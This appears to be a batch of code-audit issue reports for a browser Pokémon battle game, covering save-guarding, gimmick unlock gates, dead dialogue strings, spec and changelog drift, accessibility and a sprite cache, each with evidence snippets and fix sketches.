## <a id="ISSUE-124"></a> ISSUE-124: `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save

---
id: ISSUE-124
severity: P3
category: dx
anchor_symbol: _storyEnemyMechKeys
current_line_hint: ~31328
file: battle.html
agents: [story-mode-investigator]
fingerprint: d5c6a99636ec
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_storyEnemyMechKeys` doesn't guard against missing `sm.settings` — could throw on a malformed save

**Evidence**:
```js
// battle.html ~31328
function _storyEnemyMechKeys() {
    const k = [];
    const unlocked = new Set(Array.isArray(sm.unlockedGimmicks) ? sm.unlockedGimmicks : []);
    if (sm.settings.dynaOn && unlocked.has('dmax')) k.push('gmax');    // ← throws if sm.settings undefined
    if (sm.settings.megaOn && unlocked.has('mega')) k.push('mega');
    ...
}
```
A corrupted save (deleted `sm.settings`, partial load) would throw `TypeError: Cannot read property 'dynaOn' of undefined`. The function is called from inside `_applyEnemyGimmickDistribution` → `rollTrainerTeam` — every battle entry. The `try/catch` at startBattle (`forEach` wrap at line 15319) catches the throw but the foe team won't have mechanics.

**Repro**: Construct a save with `version: SAVE_VER` but no `settings` key, load it. `_storyEnemyMechKeys()` throws.

**Blast radius**: Low — the load() function already enforces `sm.settings` exists (lines 30903-30917 add defaults). The throw is theoretically reachable via direct console mutation. Defensive coding only.

**Fix sketch**: Add the standard pre-guard:
```js
function _storyEnemyMechKeys() {
    const k = [];
    if (!sm || !sm.settings) return k;
    const unlocked = new Set(Array.isArray(sm.unlockedGimmicks) ? sm.unlockedGimmicks : []);
    ...
}
```

**Verification**: After fix, calling `_storyEnemyMechKeys()` with `sm = {}` returns `[]` instead of throwing.

---

## <a id="ISSUE-125"></a> ISSUE-125: CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches

---
id: ISSUE-125
severity: P3
category: bug
anchor_symbol: _storyMaxPartySize
current_line_hint: ~41170
file: battle.html
agents: [story-mode-investigator]
fingerprint: 306eabc530b8
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — party-cap curve = min(6, 2+badges) with no off-by-one; foe sizing matches

**Evidence**:
```js
function _storyMaxPartySize() {
    const badges = (sm && sm.badges) | 0;
    return Math.max(2, Math.min(6, 2 + badges));   // 41172
}
// Foe size (41137): finales=6; intro rival=playerTeamLen; else max(roleFloor, 2+badges)
```

**Repro**: `_storyMaxPartySize` (41170) returns `max(2, min(6, 2+badges))`, used consistently at catch (44933), Professor (40707), daycare (39683), and the cap-teach overlay (42650). Foe sizing `_storyEnemyPartySize` (41137) mirrors it with finale=6 + intro-rival player-match special cases + a role-floor safety net. No off-by-one at catch time or Professor-offer time.

**Blast radius**: Tier-1 #3 — clean.

**Fix sketch**: None — positive confirmation.

**Verification**: badges 0→4 yields cap 2,3,4,5,6; intro rival is 1v1; finales always 6.

---

## <a id="ISSUE-126"></a> ISSUE-126: Variant rival quote pools are uneven — several phases have a single line; many phases absent

---
id: ISSUE-126
severity: P3
category: refactor
anchor_symbol: _VARIANT_RIVAL_QUOTES
current_line_hint: ~37458
file: battle.html
agents: [consistency-auditor]
fingerprint: 156f9f10653f
confidence: medium
status: open
---

**Title**: Variant rival quote pools are uneven — several phases have a single line; many phases absent

**Evidence**:
```js
// 37458 — _VARIANT_RIVAL_QUOTES: phase-keyed (0=intro … 4=league). Single-line phases:
bone_keepers:   { 0:[1 line], 2:[1 line], 4:[1 line] },   // no phase 1, 3
project_mewtwo: { 0:[1 line], 2:[1 line], 4:[1 line] },   // no phase 1, 3
lavender_frequency:{ 0:[1 line], 3:[1 line], 4:[1 line] },// no phase 1, 2
```

**Repro**: `getTrainerQuoteForBattle` draws the variant rival line at 50% when a pool exists for the phase; a single-line phase always returns that one line on every variant rival encounter in that phase. The base TRAINER_QUOTES['Rival'] (10 lines) + standing pools still cover the other 50%, so this is not a hard "repeats instantly" bug — but within the variant voice it is one-line-deep, and the comment ("Sparse on purpose") confirms intent.

**Blast radius**: Voice-depth consistency only. The pasta variants are the texture the design charter (REDESIGN_PLAN §1, "creepypasta/leaker texture") leans on; one-line phases thin that texture on repeat rival fights. Lower priority than the base pools, which are deep (TRAINER_QUOTES_BY_NAME, LEADER_VICTORY_LINES, etc. are all ≥2-3 lines and exhaustive across every Gym Leader / E4 / Champion).

**Fix sketch**: Optional — bring the thin variant phases (bone_keepers, project_mewtwo, lavender_frequency) to ≥2 lines each, or accept the sparseness and leave a one-line note that the base Rival pool is the depth backstop. No code change needed; data-only.

**Verification**: Each populated variant phase has ≥2 lines, or a comment documents the single-line-by-design decision.

---

## <a id="ISSUE-127"></a> ISSUE-127: CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path

---
id: ISSUE-127
severity: P3
category: bug
anchor_symbol: _withStoryPlayerGimmickGate
current_line_hint: ~11419
file: battle.html
agents: [story-mode-investigator]
fingerprint: fc7eab00919a
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — mechanics unlock gate has no leak on any player or enemy path

**Evidence**:
```js
// Player paths all wrap makeBuild with the gate:
//   37975 evolution/swap, 40794 Professor, 43721 boss arc (_bossArcRollLegendary),
//   44295 makeWildBuild, 47484 evolution, 37975 roamingLegendary prepare
build = _withStoryPlayerGimmickGate(() => makeBuild(name));
// Enemy side: _storyEnemyMechKeys filters by sm.unlockedGimmicks (32848)
if (S.megaOn && unlocked.has('mega')) k.push('mega');  // etc.
```

**Repro**: Audited every `makeBuild` caller. All six player-acquisition paths (Professor, wild catch incl. roaming-legendary `prepare` at 37975, boss-arc `_bossArcRollLegendary`, evolution, swap) wrap with `_withStoryPlayerGimmickGate`. The gate's consumer `_mechForGimmickRoll` (11400) ALSO requires `settings.mechanics.X` (synced from `sm.settings` by `applyMechanicsToSettings`), so a disabled mechanic never rolls even with the flag on. Enemy gimmicks gate via `_storyEnemyMechKeys`→`sm.unlockedGimmicks`. Cable Link (`_makePlayerLinkBuild` at 46970) is the SOLE deliberate exception (maintainer decision 2026-05-25, CHANGELOG-documented) — still bounded by `settings.mechanics`.

**Blast radius**: This is the most security-sensitive Tier-1 item and it is solid. No P0/P1 leak.

**Fix sketch**: None — positive confirmation. (The prior audit could not assess this because catch/boss-arc didn't exist yet.)

**Verification**: `grep -n "makeBuild" battle.html` cross-checked against gate wrapping — only Cable Link is intentionally ungated.

---

## <a id="ISSUE-128"></a> ISSUE-128: `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented

---
id: ISSUE-128
severity: P3
category: dx
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~13244
file: battle.html
agents: [story-mode-investigator]
fingerprint: e02d0b455313
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `applyFoeDifficultyScaling`'s "additive league boost" comment narrates a fix that was never implemented

**Evidence**:
```js
// battle.html ~13244 (inside applyFoeDifficultyScaling)
// > League boost (E1-E4 / Champion / league Rival / post-HoF Mystery)
// > is stored as additive deltas on the mon by applyStoryLeagueFoeStatBoost
// > so difficulty and boss boost stack ADDITIVELY (not multiplicatively).
// > Stops the 1.30 × 1.40 = 1.82 cliff between Normal and Challenge.
const lb = mon._leagueStatBonus;        // always undefined
const hpMult = mult + (lb && lb.hp ? lb.hp : 0);  // collapses to: mult
```
The actual `applyStoryLeagueFoeStatBoost` (line 30729) mutates `mon.maxHp *= hpM` and **never** writes `mon._leagueStatBonus`. The two comments contradict each other:
- Line 13245: "stack additively"
- Line 30766: "applied BEFORE difficulty scaling, so hard/challenge mode stacks on top multiplicatively"

The code matches line 30766. The line 13244 comment is a description of an intended fix that was never landed.

**Repro**: `grep -nE "_leagueStatBonus" battle.html` returns exactly one hit (read site only).

**Blast radius**: Documentation-debt only — the stat code works, just not the way the comment describes. Any contributor reading the line-13244 block to understand how league boost interacts with difficulty will be misled.

**Fix sketch**: Pair with the P1 fingerprint above. Either (a) delete the additive comment & confirm the multiplicative behavior is intentional, or (b) finish implementing the additive merge by writing `_leagueStatBonus` in `applyStoryLeagueFoeStatBoost` instead of mutating `maxHp` directly.

**Verification**: After (a), the line-13244 comment matches the code reality. After (b), the P1 stack-multiplicatively bug is also resolved.

---

## <a id="ISSUE-129"></a> ISSUE-129: Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY

---
id: ISSUE-129
severity: P3
category: inconsistency
anchor_symbol: applyStoryLeagueFoeStatBoost
current_line_hint: ~32108
file: battle.html
agents: [story-mode-investigator]
fingerprint: 25cb66b09cd0
confidence: high
status: open
---

**Title**: Spec §8 says league boost stacks MULTIPLICATIVELY with difficulty; code now stacks ADDITIVELY

**Evidence**:
```js
// battle.html:32108 — league boost stored as ADDITIVE delta
// "...so applyFoeDifficultyScaling can merge with the difficulty multiplier
//  additively (e.g., Challenge 1.30 + Champion 0.40 = 1.70, not the
//  multiplicative 1.30 × 1.40 = 1.82 cliff)."
mon._leagueStatBonus = { hp: hpM-1, bulk: bulkM-1, spe: speM-1 };
```

**Repro**: STORY_MODE_FLOW §8 still reads "applyStoryLeagueFoeStatBoost … is applied before applyFoeDifficultyScaling, so the two stack multiplicatively. Champion HP on Hard ≈ ×1.30 × ×1.15 = ×1.495." The code (32108–32122) was reworked to additive merging — this directly FIXES prior audit finding 2.5 (the +56% vs +20% cliff). The spec doc was not updated.

**Blast radius**: Spec-vs-code only; the code is the better behavior. STORY_MODE_FLOW §15c/15e also describe Crucible Hard Mode stacking that should be reconciled with §8.

**Fix sketch**: Update STORY_MODE_FLOW §8 to describe the additive merge and remove the "×1.495" example.

**Verification**: Spec matches code's additive model.

---

## <a id="ISSUE-130"></a> ISSUE-130: `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere

---
id: ISSUE-130
severity: P3
category: dx
anchor_symbol: catchUnlocked
current_line_hint: ~30597
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9facd1ec61ac
confidence: high
status: wontfix-sm.catchUnlocked-reserved-for-future-toggle-feature
---

**Title**: `sm.catchUnlocked` is written by migration + newStoryRun but never read anywhere

**Evidence**:
```bash
$ grep -nE "catchUnlocked" battle.html
30597:            if (typeof sm.catchUnlocked !== 'boolean') sm.catchUnlocked = false;
30672:                   catchUnlocked: false,         # sm default
33704:                catchUnlocked: false,            # newStoryRun
```
Three writes, zero reads.

`STORY_MODE_FLOW.md §10` documents the field as:
> `catchUnlocked: false, // toggles wild-route prompts; flipped on after first wild route entry or starter`

So the spec promised the field would gate something. The implementation never wired the read.

**Repro**: After v15+ migration, `sm.catchUnlocked` is always `false`. No code path observes the flag.

**Blast radius**: 4 bytes of save bloat per slot. Future contributors may assume the field gates something and add a guard, only to find it never flips.

**Fix sketch**: Either (a) remove the field from `sm` defaults + newStoryRun + migration; or (b) actually gate the wild-route catch prompt on it (with the side-effect that pre-v15-then-restored saves never see the prompt fire). Option (a) is the cheap fix.

**Verification**: After (a), `grep -nE "catchUnlocked" battle.html` returns 0.

---

## <a id="ISSUE-131"></a> ISSUE-131: CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion

---
id: ISSUE-131
severity: P3
category: inconsistency
anchor_symbol: CHAMPION_VICTORY_LINES
current_line_hint: ~29723
file: battle.html
agents: [consistency-auditor]
fingerprint: 743b2b45931a
confidence: high
status: open
---

**Title**: CHAMPION_VICTORY_LINES['Hau'] is dead — Hau is an Elite Trainer, never a Champion

**Evidence**:
```js
// CHAMPION_VICTORY_LINES (line ~29723):
'Hau':"Hau: \"Alola! You're a malasada-sweet Champion now!\"",
// but Hau's only TRAINER_DATA row (line ~29049) is role 'Elite Trainer':
{ role:'Elite Trainer', name:'Hau', type:'Normal', sigs:[...], spriteFile:'Hau' },
```

**Repro**: `node -e` cross-reference of CHAMPION_VICTORY_LINES keys vs. `role:'Champion'` names in TRAINER_DATA — "Hau" appears in the victory-line table but is not a Champion-role trainer. The Champion slot is filled only by `t.role === 'Champion'` (selectTrainerForRole / find-by-name guards), so showVictoryOverlay's Champion branch can never look up Hau.

**Blast radius**: Dead string only — no player will ever see it. Harmless, but it is misleading to future authors (implies Hau can be the Champion) and inflates the pool. Note the inverse is clean: every actual Champion (Blue, Lance, Steven Stone, Wallace, Cynthia, Alder, Iris, Diantha, Prof. Kukui, Leon, Geeta, Red) has both an intro pool and a victory line.

**Fix sketch**: Either remove the Hau entry from CHAMPION_VICTORY_LINES, or — if Hau is intended as a future Champion — add a `role:'Champion'` Hau row to TRAINER_DATA. Removing is the lower-risk option.

**Verification**: Re-run the keys-vs-roster cross-reference; CHAMPION_VICTORY_LINES should have no keys outside the Champion roster.

---

## <a id="ISSUE-132"></a> ISSUE-132: CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it

---
id: ISSUE-132
severity: P3
category: inconsistency
anchor_symbol: CHANGELOG
current_line_hint: ~22
file: CHANGELOG.md
agents: [story-mode-investigator]
fingerprint: f7bb006d3e94
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: CHANGELOG 2026-05-21 entry claims Cable Link is ungated but the implementation in v18 explicitly gates it

**Evidence**:
```
CHANGELOG.md (lines 23-27):
> Cable Link is deliberately left ungated — its premium "another
> trainer's mon" vibe (high reroll cost, can surface pre-unlock
> gimmicks) is the only sanctioned shortcut.

STORY_MODE_FLOW.md §15d (line 712-715):
> The shared helper preserves the existing player gimmick gating
> (_pbsStoryUsePlayerGimmickGate) — Cable Link only rolls gimmicks
> the player has unlocked via gym victories.

battle.html ~42374 _makePlayerLinkBuild:
> [explicitly applies the gate; see fingerprint 4b6cce4cb746]
```
Three sources, two stories. CHANGELOG says ungated, spec says gated, code matches the spec. The CHANGELOG description of the unlock-gate-closed pass is wrong/stale.

**Repro**: Read CHANGELOG lines 23-27 alongside `STORY_MODE_FLOW.md §15d` and `_makePlayerLinkBuild` at line 42374.

**Blast radius**: Documentation only. A contributor following the CHANGELOG to understand Cable Link will be surprised when their pre-Gym-5 reroll never surfaces a Mega.

**Fix sketch**: Rewrite the CHANGELOG entry's "Cable Link is deliberately left ungated" paragraph to reflect actual code:
> Cable Link applies the same gimmick gate via `_makePlayerLinkBuild`
> (see `STORY_MODE_FLOW.md §15d`). The "premium another trainer's mon"
> vibe is preserved via the higher reroll cost + Tournament-tier
> build, not via mechanics surfacing pre-unlock.

**Verification**: After fix, CHANGELOG + spec + code all agree.

---

## <a id="ISSUE-133"></a> ISSUE-133: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

---
id: ISSUE-133
severity: P3
category: refactor
anchor_symbol: createRoom_23505
current_line_hint: ~349
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16_2
confidence: low
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

**Evidence**:
```js
// online-pvp.js L341-351
for (let attempt = 0; attempt < 8; attempt++) {
    roomCode = randomCode();
    const ins = await sb.from('pvp_rooms').insert({ code: roomCode, data }).select('id').single();
    if (!ins.error) { row = ins.data; break; }
    lastErr = ins.error;
    const dup = ins.error && (ins.error.code === '23505' || String(ins.error.message || '').toLowerCase().includes('duplicate'));
    //                                          ^^^^^^^ Postgres SQLSTATE for "unique_violation"
    if (!dup) throw ins.error;
}
```

**Repro**: Cosmetic. The fallback `.includes('duplicate')` covers the case where Supabase's error mapping changes (`error.code` becoming `'PGRST116'` or similar). Brittle to copy-paste into other tables (e.g., the gauntlet_leaderboard insert pattern in migration 002).

**Blast radius**: One site. No active bug.

**Fix sketch**: Add a constant `const PG_UNIQUE_VIOLATION = '23505';` at the top of the module with a one-line comment linking the Postgres docs. Or factor a helper `function isUniqueViolation(err)` so future callers (gauntlet leaderboard insert, etc.) share the same check.

**Verification**: Mechanical.

---

## <a id="ISSUE-134"></a> ISSUE-134: ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss

---
id: ISSUE-134
severity: P3
category: inconsistency
anchor_symbol: ELITE_VICTORY_LINES
current_line_hint: ~29703
file: battle.html
agents: [consistency-auditor]
fingerprint: a8e2044035af
confidence: high
status: open
---

**Title**: ELITE_VICTORY_LINES['Molayne'] is dead — Molayne is an Elite Trainer, not an E1–E4 boss

**Evidence**:
```js
// ELITE_VICTORY_LINES (line ~29703):
'Molayne':"Molayne: \"My circuits are humming. You earned the next gate.\"",
// but Molayne's only TRAINER_DATA row (line ~29100) is role 'Elite Trainer':
{ role:'Elite Trainer', name:'Molayne', type:'Steel', sigs:[...], spriteFile:'Molayne' },
// ELITE_VICTORY_LINES is only read on /^E[1-4]$/ events in showVictoryOverlay (~43047)
```

**Repro**: Cross-reference ELITE_VICTORY_LINES keys vs. the E1–E4 roster (`role:'E[1-4]'`). "Molayne" is in the table but is only an `Elite Trainer` (the generic ace class), which surfaces as the "Elite Trainer" / "Ace Trainer" event — never an `E1`–`E4` slot. showVictoryOverlay reads ELITE_VICTORY_LINES only inside the `/^E[1-4]$/` branch, so Molayne's line is unreachable.

**Blast radius**: Dead string only. All 31 actual E1–E4 names resolve to both an ELITE_VICTORY_LINES entry and a TRAINER_QUOTES_BY_NAME intro pool, so the live data is complete — this is just a stray key (mirrors the Hau case in the Champion table).

**Fix sketch**: Remove the Molayne entry from ELITE_VICTORY_LINES (he speaks via TRAINER_QUOTES_BY_NAME on intro as an Elite Trainer; there is no E1–E4 victory-card path for that class). Leave the rest of the table as-is.

**Verification**: Re-run the keys-vs-roster cross-reference; ELITE_VICTORY_LINES should have no keys outside the E1–E4 roster.

---

## <a id="ISSUE-135"></a> ISSUE-135: Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene

---
id: ISSUE-135
severity: P3
category: inconsistency
anchor_symbol: enterArtifactShop
current_line_hint: ~45536
file: battle.html
agents: [consistency-auditor]
fingerprint: 6f0acce30a29
confidence: high
status: open
---

**Title**: Relic Annex intro uses plain-text `_storyShowOneTimeTip`; every other facility uses a sprite-backed scene

**Evidence**:
```js
// 45536 — Relic Annex first-visit intro (text-only tip, no NPC sprite/nameplate):
try { _storyShowOneTimeTip('relic',
  'The Relic Annex.\n\nThree relics on the shelf, one purchase per visit. …'); } catch (e) {}
// vs STORY_TUTORIAL_SCENES entries (firstSafari, firstStoneShop, firstMoveTutor, …)
// which render sprite + nameplate + Continue via _showStoryTutorialScene.
```

**Repro**: First visit to the Relic Annex shows a plain text tip box. First visit to Safari/Stone Shop/Move Tutor/Dept/etc. shows a character-portrait dialog scene (Safari Warden, Emporium Keeper, etc.). The relic intro is present and well-written — only the *delivery mechanism* is inconsistent with the other 19 facility intros.

**Blast radius**: Purely presentational. REDESIGN_PLAN §2 promotes the artifact store to an always-on top-level action with a "mandatory one-time intro (dark-mysterious tone)" — the relic intro should match the sprite-scene treatment the redesign expects, and a Relic Keeper sprite already exists (used by the recurring `relicKeeper` quote pool).

**Fix sketch**: Add a `firstRelic` entry to STORY_TUTORIAL_SCENES (sprite + "Relic Keeper" nameplate, reuse the existing copy) and call `playStoryTutorial('firstRelic')` from enterArtifactShop in place of the `_storyShowOneTimeTip('relic', …)` call.

**Verification**: First Relic Annex visit shows a portrait dialog matching the other facility intros; the dark-mysterious framing reads in the Relic Keeper's voice.

---

## <a id="ISSUE-136"></a> ISSUE-136: `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate`

---
id: ISSUE-136
severity: P3
category: dx
anchor_symbol: enterProfessor
current_line_hint: ~36966
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6240f054e598
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `enterProfessor` duplicates gimmick-gate logic inline instead of using `_withStoryPlayerGimmickGate`

**Evidence**:
```js
// battle.html ~36966  (enterProfessor choice loop)
try {
    window._pbsStoryUsePlayerGimmickGate = true;
    window._pbsStoryUnlockedGimmicks = sm.unlockedGimmicks || [];
    build = makeBuild(name);
} finally {
    window._pbsStoryUsePlayerGimmickGate = false;
    delete window._pbsStoryUnlockedGimmicks;
}

// battle.html ~10766 — the helper EXISTS:
function _withStoryPlayerGimmickGate(fn) {
    try {
        window._pbsStoryUsePlayerGimmickGate = true;
        window._pbsStoryUnlockedGimmicks = (typeof sm !== 'undefined' && sm && Array.isArray(sm.unlockedGimmicks)) ? sm.unlockedGimmicks : [];
        return fn();
    } finally { ... }
}
```
Same idiom also duplicated in `_makePlayerLinkBuild` (line 42374). Three identical copies of the gate logic; only `makeWildBuild` and `_bossArcRollLegendary` and the roaming-legendary prepare actually use the helper.

**Repro**: `grep -nE "_pbsStoryUsePlayerGimmickGate = true" battle.html` returns 3 sites (Professor, Link, plus implicit via the helper). The helper is two lines shorter at call sites and was added precisely to consolidate this pattern.

**Blast radius**: DX only. Every duplicated copy is a place where a future contributor might fix the gate at one site and miss the others.

**Fix sketch**: Replace the inline try/finally in `enterProfessor` and `_makePlayerLinkBuild` with `build = _withStoryPlayerGimmickGate(() => makeBuild(name));`. Identical semantics, three lines saved per site.

**Verification**: After consolidation, `grep -c "_pbsStoryUsePlayerGimmickGate = true" battle.html` returns 1 (the helper) instead of 3.

---

## <a id="ISSUE-137"></a> ISSUE-137: `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool

---
id: ISSUE-137
severity: P3
category: bug
anchor_symbol: enterProfessor
current_line_hint: ~36935
file: battle.html
agents: [story-mode-investigator]
fingerprint: 11baf155adf0
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `enterProfessor` reuses `_pendingProfChoices` across city visits at the same cityIdx — stale picks may persist past spec'd one-shot pool

**Evidence**:
```js
// battle.html ~36935
const shouldReuseChoices = Array.isArray(_pendingProfChoices)
    && _pendingProfChoices.length > 0
    && _pendingProfCityIdx === cityIdx
    && _pendingProfWasMystery === _profMysteryMode;
```
The reuse predicate keys only on cityIdx + mystery mode. If the player visits City 3's Professor (rolls 3 choices), backs out without picking, walks all the way to City 8 and back to City 3, the same 3 picks re-appear. Spec is silent on whether picks should be re-rolled on each visit, but the current behaviour also bypasses any later changes to the enabled gens / settings that affect the roll.

**Repro**: Visit City 3 Professor; note the 3 rolled species. Decline. Walk to City 8 and back. Visit City 3 Professor again. Same 3 species (assuming `sm.profUsed[3]` was never set, which happens on Decline, not just dismissal).

**Blast radius**: Mild. Players may be subtly trapped into the same first pick across a long road trip, even though they expected fresh picks. Combined with the city-tier-specific tier curve, this means a player who returns at higher badges still sees the lower-tier rolls.

**Fix sketch**: Either invalidate `_pendingProfChoices` whenever `sm.badges` changes since the last visit, or refresh on every entry (the cost is small — three `makeBuild` calls). Or document that the reuse is intentional ("picker is sticky until you accept or until a hub state change clears it").

**Verification**: After fix, returning to a Prof at higher badges shows fresh tier-curve-appropriate picks.

---

## <a id="ISSUE-138"></a> ISSUE-138: Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map

---
id: ISSUE-138
severity: P3
category: data
anchor_symbol: FACILITY_DEBUT_CITY
current_line_hint: ~29085
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6c771c9b218f
confidence: high
status: open
---

**Title**: Service-availability timeline reference (Task 1 deliverable) — first-appearance / reappear / unlock map

**Evidence**:
```js
const FACILITY_DEBUT_CITY = {
    mart:0, tutor:0, nature:0, center:0, relic:0,
    link:2, stoneShop:2, evolab:2,
    dept:6, casino:5, dojo:4, evtrainer:4, safari:4, colress:6,
};  // fanclub omitted (opt-in, no debut gate)
```

**Repro**: Cross-referenced `FACILITY_DEBUT_CITY` (29085) + per-city action arrays in `STORY_EVENTS_RAW` + injection sites (Center 39000, Fan Club `_seedFanClubAcrossCities` 29097, Daycare 39008, Fight Club 39015, Safari 39026). Canonical service map:

| Service | First | Reappears? | Unlock |
|---|---|---|---|
| Pokémart | C0 | every city EXCEPT C6 (Dept substitutes, filtered 38561) | none |
| Move Tutor | C0 | C2–C9 (skips C1) | team≥1 |
| Nature Rater | C0 | C3,C5–C9 (skips C1,C2,C4) | team≥1 |
| Pokémon Center (PC+Underground+Rivalry) | C0 | every city (injected) | none |
| Pokémon Fan Club (IV) | C0 | every city (injected) | team≥1 |
| Relic Annex (Artifact buy) | C0 | nested under Dept (C6/C8/C9) | — |
| Link Station / Stone Shop / Stone Sage | C2 | every city after | none |
| Battle Dojo / EV Trainer / Safari | C4 | Dojo+EV every city after; Safari C4 ONLY | team≥1 (Safari city-gated) |
| Poké Casino | C5 | C5 + C9 only (cyclic) | none |
| Department Store | C6 | C6,C8,C9 (cyclic) | none |
| Colress ("Power Up") | C6 | every city after | team≥1 + a mech toggle on |
| Professor | C0 | C0–C5 pre-gym hubs; C6–C8 via shouldForceCityProfessor; hidden at party-cap (exc. C8 legendary gate); never C9 | party<cap |
| Daycare (egg) | C1 post-gym (Gym1 win) | until egg taken | sm.daycare.unlocked |
| Fight Club | C-where-6-badges | repeatable post-HoF | daycare secret @6 badges |
| The Crucible | post-HoF | every city | bossArc.available |

**Blast radius**: Reference artifact for Task 1 pacing decisions. Clumping at C2 (Link+StoneShop+StoneSage) and C4 (Dojo+EV+Safari); dead zone at C1 (see finding #10); gappy Nature Rater (#11).

**Fix sketch**: N/A — data reference. Use alongside findings #10/#11 for pacing.

**Verification**: Re-extract action lists per city; confirm against this table.

---

## <a id="ISSUE-139"></a> ISSUE-139: Gauntlet score readout is a plain div with no live region — score changes are silent to SR

---
id: ISSUE-139
severity: P3
category: a11y
anchor_symbol: gauntlet-score
current_line_hint: ~9010
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 89ea3a3e2152
confidence: medium
status: open
---

**Title**: Gauntlet score readout is a plain div with no live region — score changes are silent to SR

**Evidence**:
```html
<div id="gauntlet-score" class="hidden">Score: 0</div>
```

**Repro**: In Gauntlet mode the score updates between rounds via `gauntletScore.textContent` but the element has no `aria-live`/`role="status"`, so screen-reader users never hear their score change. (Contrast with `#field-conditions` L9036 and casino result strips, which correctly use `aria-live="polite"`.) REDESIGN_PLAN §6's Fight Club gauntlet reuses this readout, so the gap propagates.

**Blast radius**: Gauntlet HUD; future Fight Club score display.

**Fix sketch**: Add `role="status" aria-live="polite"` to `#gauntlet-score` (and any new gauntlet round-result readout).

**Verification**: SR announces the new score when it updates after a round.

---

## <a id="ISSUE-140"></a> ISSUE-140: Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior

---
id: ISSUE-140
severity: P3
category: inconsistency
anchor_symbol: getDownStatusLabel
current_line_hint: ~17613
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1e8eb0a0eb0d
confidence: high
status: open
---

**Title**: Paralysis tooltip says "Speed quartered" but engine halves speed (0.5) — stale Gen 1-6 text vs Gen 7+ behavior

**Evidence**:
```js
// Tooltip (17613): PAR: 'Paralyzed — Speed quartered · 25% chance to skip turn'
// Help text (10633): "PAR — 25% chance to skip turn, halves Speed"  (contradicts itself)
// Engine (20553): if (mon.status === "PAR" && mon.ability !== "Quick Feet") spe *= 0.5;  // HALVES
```

**Repro**: Grep `status === "PAR"` — every speed application uses `* 0.5` (lines 20553, 22290-22297). The engine is correctly Gen 7+ (halve). Only the 17613 tooltip string says "quartered" (Gen 1-6). The 10633 help blurb already says "halves Speed", so the two UI strings disagree.

**Blast radius**: Cosmetic/trust only — no damage or turn-order impact. Players reading the pill tooltip will mis-estimate paralysis speed.

**Fix sketch**: Change the 17613 tooltip from "Speed quartered" to "Speed halved" to match the engine and the 10633 help text.

**Verification**: Grep confirms no remaining "quartered" PAR string; UI pill matches the help blurb.

---

## <a id="ISSUE-141"></a> ISSUE-141: Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session

---
id: ISSUE-141
severity: P3
category: perf
anchor_symbol: getSprite
current_line_hint: 12726
file: battle.html
agents: [performance-profiler]
fingerprint: 92e4f7817cc9
confidence: medium
status: open
---

**Title**: Sprite preload cache `_preloadedImages` is still an unbounded Object with no eviction — every distinct (name, shiny, back) pins an Image() for the session

**Evidence**:
```js
// battle.html:12616
const _preloadedImages = {};
// battle.html:12726
if (!_preloadedImages[url]) {
    let img = new Image(); img.src = url; _preloadedImages[url] = img;
}
```
(Lines drifted from the prior profiler's 11983/12036 cite; the unbounded pattern is unchanged.) This cache lives in the browser image-decoder pool, NOT the V8 heap, so it does not appear in `process.memoryUsage()` — the jsdom memory benchmark above cannot see it, which is exactly why it needs to be called out separately at this review gate.

**Repro**: `grep -n _preloadedImages battle.html` shows one declaration + one assignment-in-loop; no eviction logic. A full story sees 100–300 unique mons; × shiny/back variants → 500+ cached Images on a long save.

**Blast radius**: Forward-looking, and amplified by the redesign: a **daycare with per-run egg state** plus the **Fight Club gauntlet** will surface many more distinct species per session (eggs hatch new mons; gauntlet draws wide rosters). At ~5–50 KB per Showdown GIF, 500+ entries ≈ 10–25 MB of pinned image data — a real OOM contributor on low-RAM mobile.

**Fix sketch**: Convert `_preloadedImages` to a bounded LRU (~100 entries) or drop the explicit `new Image()` preload entirely — appended `<img src>` elements are cached by the browser automatically, so the Image() instances duplicate the cache.

**Verification**: In a long browser session, confirm `Object.keys(_preloadedImages).length` plateaus at the cap instead of growing monotonically.

---

## <a id="ISSUE-142"></a> ISSUE-142: CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3)

---
id: ISSUE-142
severity: P3
category: bug
anchor_symbol: GYM_CITY_LEADER_EVENT
current_line_hint: ~29743
file: battle.html
agents: [story-mode-investigator]
fingerprint: da9a1c34d71e
confidence: high
status: open
---

